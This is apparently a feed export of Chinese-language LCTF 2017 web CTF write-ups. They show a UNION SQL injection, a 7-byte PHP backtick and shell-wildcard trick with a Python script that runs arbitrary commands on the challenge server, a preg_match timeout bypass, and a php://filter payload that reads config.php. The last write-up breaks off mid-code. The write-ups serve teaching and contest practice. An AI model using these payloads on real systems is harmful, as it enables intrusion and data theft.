<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">POST:pro_id=-2513 UNION ALL SELECT NULL,CONCAT((select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from product_2017ctf)e limit 1 offset 3 )),NULL,NULL--</div><div class="line"></div><div class="line">product name:7195ca99696b5a896.php</div></pre></td></tr></table></figure>
<p>最终获得完整的结构与数据如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">product_id:  1,2,3</div><div class="line">product_name: car,iphone11,nextentrance</div><div class="line">owner:Tom John Boss</div><div class="line">d067a0fa9dc61a6e:wobuzaizheli nextnext 7195ca99696b5a896.php</div></pre></td></tr></table></figure></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>在做的过程，有想利用innodb引擎来注入，不过好像没啥用2333<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">POST:</div><div class="line">pro_id=-2513 UNION ALL SELECT NULL,CONCAT((select table_name from innodb_table_stats)),NULL,NULL--</div><div class="line"></div><div class="line">&apos;youcanneverfindme17.innodb_table_stats&apos; doesn&apos;t exist</div><div class="line">数据库：youcanneverfindme17</div></pre></td></tr></table></figure></p>
<p>根据tips，得到下一个入口地址:d067a0fa9dc61a6e7195ca99696b5a896.php<br><!-- Tip:将表的某一个字段名，和表中某一个表值进行字符串连接，就可以得到下一个入口喽~ --></p>
<h2 id="PHP的命令执行"><a href="#PHP的命令执行" class="headerlink" title="PHP的命令执行"></a>PHP的命令执行</h2><p><a href="http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php" target="_blank" rel="external">http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/12.png?raw=true" alt=""></p>
<p>到了这里就跟 <a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/web/tinyhosting-250" target="_blank" rel="external">32c3 2015 ctf-TinyHosting</a>的题目很像了。</p>
<p>就几个知识点展开说一说。</p>
<p>一个是<a href="http://php.net/manual/zh/language.basic-syntax.phptags.php" target="_blank" rel="external">php的短标签</a>。当php.ini的<code>short_open_tag=on</code>时，PHP支持短标签，默认情况下为off。当开启后能执行<code>&lt;? ?&gt;</code>标签内的php语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:/var/www/html$ cat test.php</div><div class="line">&lt;? echo &quot;chybeta\n&quot;;?&gt;</div><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">chybeta</div><div class="line">chybeta@ubuntu:/var/www/html$</div></pre></td></tr></table></figure></p>
<p>另一个知识点是<a href="http://php.net/manual/zh/language.operators.execution.php" target="_blank" rel="external">php的反引号命令执行</a>，php会反引号内的内容作为shell命令执行，效果与 shell_exec()同。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:/var/www/html$ cat test.php</div><div class="line">&lt;? $temp = `date`; echo $temp;?&gt;</div><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">Wed Nov 22 22:01:34 CST 2017</div><div class="line">chybeta@ubuntu:/var/www/html$</div></pre></td></tr></table></figure></p>
<p>第三个知识点是关于<a href="http://php.net/manual/zh/function.echo.php" target="_blank" rel="external">php的echo</a>，echo有个快捷写法，可以在打开标记前直接用一个等号。见下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">chybeta</div><div class="line">chybeta@ubuntu:/var/www/html$ vim test.php</div><div class="line">chybeta@ubuntu:/var/www/html$ cat test.php</div><div class="line">&lt;?=&quot;chybeta\n&quot;;</div><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">chybeta</div><div class="line">chybeta@ubuntu:/var/www/html$</div></pre></td></tr></table></figure></p>
<p>我们的需求：执行命令，得到回显。结合上面三个知识点，在7个字节的限制下，比如构造如下（）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?=`w`;</div></pre></td></tr></table></figure></p>
<p>（题外话：命令<code>w</code>用于显示已经登陆系统的用户列表）</p>
<p>运行结果：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/21.png?raw=true" alt=""></p>
<p>不过怎么执行任意命令呢？这里用到第四个知识点，shell中的通配符<code>*</code>会将符合模式的文件列出来，之后执行，详情可见这里<a href="http://man.chinaunix.net/linux/mandrake/101/zh_cn/Command-Line.html/glob-regex.html" target="_blank" rel="external">Shell 通配符</a>。所以当文件夹下有如下文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash z.sh</div></pre></td></tr></table></figure></p>
<p>而我在shell中直接键入一个<code>*</code>即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu: *</div></pre></td></tr></table></figure></p>
<p>shell会匹配并进行替换，完成替换后实际执行的命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu: bash c.sh</div></pre></td></tr></table></figure></p>
<p>由于这属于shell后台自动完成就不展示了。</p>
<p>接着要考虑一点，我们需要用<code>*</code>来利用文件名执行任意命令，因此在文件名的构造顺序上需要注意。比如我们最终要在文件下生成这三个文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash c.sh z.php</div></pre></td></tr></table></figure></p>
<p>才能成功的执行c.sh。</p>
<p>附上利用脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">url = <span class="string">"http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php"</span></div><div class="line">user_agent = <span class="string">"xxx"</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">	command = raw_input(<span class="string">"input command: "</span>)</div><div class="line">	t = requests.post(url, headers = &#123;<span class="string">'User-agent'</span>: user_agent &#125;, data = &#123;<span class="string">"filename"</span>:<span class="string">"z.php"</span>, <span class="string">"content"</span>:<span class="string">"&lt;?=`*`;"</span>&#125;).text</div><div class="line">	[path] = re.findall(<span class="string">'files.*/zzz.php'</span>, t)</div><div class="line"></div><div class="line">	requests.post(url, headers = &#123;<span class="string">'User-agent'</span>: user_agent &#125;, data = &#123;<span class="string">"filename"</span>:<span class="string">"bash"</span>, <span class="string">"content"</span>:<span class="string">'anything'</span>&#125;)</div><div class="line">	requests.post(url, headers = &#123;<span class="string">'User-agent'</span>: user_agent &#125;, data = &#123;<span class="string">"filename"</span>:<span class="string">"c.sh"</span>, <span class="string">"content"</span>: command&#125;)</div><div class="line">	url1 = <span class="string">"http://182.254.246.93/"</span></div><div class="line">	r = requests.get(url1+path)</div><div class="line">	<span class="keyword">print</span> r.text</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/4.png?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$flag = &quot;LCTF&#123;n1ver_stop_nev2r_giveup&#125;&quot;;</div></pre></td></tr></table></figure></p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
<li>基于报错的sql注入：<ul>
<li>获取库名，表名，列名，数据</li>
<li>join using</li>
</ul>
</li>
<li>php技巧:<ul>
<li>短标签</li>
<li>反引号</li>
<li>echo缩写</li>
</ul>
</li>
<li>shell通配符</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;补充关于第一阶段sql注入知识/背景，第二节阶段命令执行详细过程及其知识点&lt;/p&gt;
&lt;p&gt;LCTF-2017-他们有什么秘密呢-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>LCTF-2017-萌萌哒报名系统-writeup</title>
    <link href="http://chybeta.github.io/2017/11/19/LCTF-2017-%E8%90%8C%E8%90%8C%E5%93%92%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F-writeup/"/>
    <id>http://chybeta.github.io/2017/11/19/LCTF-2017-萌萌哒报名系统-writeup/</id>
    <published>2017-11-19T12:52:48.000Z</published>
    <updated>2017-11-19T23:24:21.107Z</updated>
    
    <content type="html"><![CDATA[<p>趁着期中考，复习累了做几道ctf玩玩，只做出来3道web。感谢师傅们出的题！先放上简单的wp版本，一些细节后续再更新吧。</p>
<p>LCTF-2017-萌萌哒报名系统-writeup<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">天依花了一整天的时间用IDE开发了一个报名系统，现在她睡着了，难道你们不想做点什么嘛XD?</div><div class="line">http://123.206.120.239/</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><p>根据题目信息，用了IDE,比如phpstrom，以前做百度杯时碰到过。尝试访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://123.206.120.239/.idea/workspace.xml</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/13.png?raw=true" alt=""></p>
<p>发现源码包：xdcms2333.zip。下载下来进行审计。</p>
<h2 id="基本流程梳理"><a href="#基本流程梳理" class="headerlink" title="基本流程梳理"></a>基本流程梳理</h2><h3 id="regisrer-php"><a href="#regisrer-php" class="headerlink" title="regisrer.php"></a>regisrer.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">	<span class="keyword">try</span>&#123;</div><div class="line">		$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</div><div class="line">	&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</div><div class="line">	&#125;</div><div class="line">	$admin = <span class="string">"xdsec"</span>.<span class="string">"###"</span>.str_shuffle(<span class="string">'you_are_the_member_of_xdsec_here_is_your_flag'</span>);</div><div class="line">    $username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</div><div class="line">    $password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</div><div class="line">    $code = (<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]) === <span class="keyword">true</span>) ? (string)$_POST[<span class="string">'code'</span>] : <span class="string">''</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strlen($username) &gt; <span class="number">16</span> || strlen($username) &gt; <span class="number">16</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Invalid input'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT username FROM users WHERE username = :username'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</div><div class="line">    <span class="keyword">if</span> ($sth-&gt;fetch() !== <span class="keyword">false</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'username has been registered'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO users (username, password) VALUES (:username, :password)'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':password'</span> =&gt; $password]);</div><div class="line"></div><div class="line">    preg_match(<span class="string">'/^(xdsec)((?:###|\w)+)$/i'</span>, $code, $matches);</div><div class="line">    <span class="keyword">if</span> (count($matches) === <span class="number">3</span> &amp;&amp; $admin === $matches[<span class="number">0</span>]) &#123;</div><div class="line">        $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO identities (username, identity) VALUES (:username, :identity)'</span>);</div><div class="line">        $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':identity'</span> =&gt; $matches[<span class="number">1</span>]]);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO identities (username, identity) VALUES (:username, "GUEST")'</span>);</div><div class="line">        $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</div><div class="line">    &#125;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("register success");location.href="./index.html"&lt;/script&gt;'</span>;</div></pre></td></tr></table></figure>
<h3 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	session_start();</div><div class="line">	<span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">	<span class="keyword">try</span>&#123;</div><div class="line">		$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</div><div class="line">	&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</div><div class="line">	&#125;</div><div class="line">	$username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</div><div class="line">    $password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strlen($username) &gt; <span class="number">32</span> || strlen($password) &gt; <span class="number">32</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Invalid input'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT password FROM users WHERE username = :username'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</div><div class="line">    <span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] !== $password) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'wrong password'</span>);</div><div class="line">    &#125;</div><div class="line">    $_SESSION[<span class="string">'username'</span>] = $username;</div><div class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">'is_logined'</span>]);</div><div class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">'is_guest'</span>]);</div><div class="line">	<span class="comment">#echo $username;</span></div><div class="line">	header(<span class="string">"Location: member.php"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h3 id="member-php"><a href="#member-php" class="headerlink" title="member.php"></a>member.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	error_reporting(<span class="number">0</span>);</div><div class="line">	session_start();</div><div class="line">	<span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) === <span class="keyword">false</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'please login first'</span>);</div><div class="line">    &#125;</div><div class="line">	<span class="keyword">try</span>&#123;</div><div class="line">		$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</div><div class="line">	&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</div><div class="line">	&#125;</div><div class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT identity FROM identities WHERE username = :username'</span>);</div><div class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $_SESSION[<span class="string">'username'</span>]]);</div><div class="line">    <span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] === <span class="string">'GUEST'</span>) &#123;</div><div class="line">        $_SESSION[<span class="string">'is_guest'</span>] = <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $_SESSION[<span class="string">'is_logined'</span>] = <span class="keyword">true</span>;</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'is_logined'</span>]) === <span class="keyword">false</span> || <span class="keyword">isset</span>($_SESSION[<span class="string">'is_guest'</span>]) === <span class="keyword">true</span>) &#123;</div><div class="line"></div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])===<span class="keyword">false</span>)</div><div class="line">			<span class="keyword">echo</span> <span class="string">"None"</span>;</div><div class="line">		<span class="keyword">elseif</span>(is_file($_GET[<span class="string">'file'</span>]))</div><div class="line">			<span class="keyword">echo</span> <span class="string">"you cannot give me a file"</span>;</div><div class="line">		<span class="keyword">else</span></div><div class="line">			readfile($_GET[<span class="string">'file'</span>]);</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="php的preg-match"><a href="#php的preg-match" class="headerlink" title="php的preg_match"></a>php的preg_match</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/3.png?raw=true" alt=""><br>在code部分填入超长的字符串，并且符合preg_match匹配的模式。则在register.php在preg_match时导致超时php脚本停止，字符串<code>guest</code>没有被插入成功。之后在login.php中登陆用户跳转至member.php后，下述代码将会跳过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">if ($sth-&gt;fetch()[0] === &apos;GUEST&apos;) &#123;</div><div class="line">	$_SESSION[&apos;is_guest&apos;] = true;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>并在接下来的判断中，进入else分支：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if(isset($_GET[&apos;file&apos;])===false)</div><div class="line">	echo &quot;None&quot;;</div><div class="line">elseif(is_file($_GET[&apos;file&apos;]))</div><div class="line">	echo &quot;you cannot give me a file&quot;;</div><div class="line">else</div><div class="line">	readfile($_GET[&apos;file&apos;]);</div></pre></td></tr></table></figure></p>
<p>上次微信崩溃，好像也是正则匹配搞得鬼嘛。二者原理不同，不过应该还是有某种神似的。</p>
<h2 id="php的is-file和readfile"><a href="#php的is-file和readfile" class="headerlink" title="php的is_file和readfile"></a>php的is_file和readfile</h2><p>在进入成功后，需要提供file参数来读取文件。需要绕过is_file，考虑配合php伪协议。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/member.php?file=php://filter/read=convert.base64-encode/resource=config.php</div></pre></td></tr></table></figure></p>
<p>isfile判断为假，而readfile利用伪协议读取到config.php文件</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/2.png?raw=true" alt=""></p>
<p>得到config.php源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$user = <span class="string">"xdsec"</span>;</div><div class="line">$pass = <span class="string">"xdsec"</span>;</div><div class="line">$flag = <span class="string">"LCTF&#123;pr3_maTch_1s_A_amaz1ng_Function&#125;"</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LCTF&#123;pr3_maTch_1s_A_amaz1ng_Function&#125;</div></pre></td></tr></table></figure></p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
<li>PHP的preg_match</li>
<li>isfile、readfile</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;趁着期中考，复习累了做几道ctf玩玩，只做出来3道web。感谢师傅们出的题！先放上简单的wp版本，一些细节后续再更新吧。&lt;/p&gt;
&lt;p&gt;LCTF-2017-萌萌哒报名系统-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>LCTF 2017-Simple blog-writeup</title>
    <link href="http://chybeta.github.io/2017/11/18/LCTF-2017-Simple-blog-writeup/"/>
    <id>http://chybeta.github.io/2017/11/18/LCTF-2017-Simple-blog-writeup/</id>
    <published>2017-11-18T14:42:04.000Z</published>
    <updated>2017-11-22T14:52:03.241Z</updated>
    
    <content type="html"><![CDATA[<p>更新：</p>
<ol>
<li>CBC翻转攻击脚本</li>
<li>格式化字符串sql注入详细解答</li>
</ol>
<p>趁着期中考，复习累了做几道ctf玩玩，只做出来3道web。感谢师傅们出的题！</p>
<p>LCTF 2017-Simple blog-writeup<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A simple blog .To discover the secret of it.</div><div class="line">http://111.231.111.54/</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://111.231.111.54/.login.php.swp</div><div class="line">http://111.231.111.54/.admin.php.swp</div></pre></td></tr></table></figure>
<p>下载下来后，用<code>vim -r</code>恢复，得到源代码：</p>
<p>login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_page</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'省略'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_token</span><span class="params">()</span></span>&#123;</div><div class="line">    $random_token = <span class="string">''</span>;</div><div class="line">    $str = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</div><div class="line">        $random_token .= substr($str, rand(<span class="number">1</span>, <span class="number">61</span>), <span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $random_token;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span>&#123;</div><div class="line">	<span class="keyword">global</span> $id;</div><div class="line">    $token = get_random_token();</div><div class="line">    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</div><div class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</div><div class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</div><div class="line">    <span class="keyword">if</span>($id === <span class="string">'admin'</span>)&#123;</div><div class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">    	$_SESSION[<span class="string">'isadmin'</span>] = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div 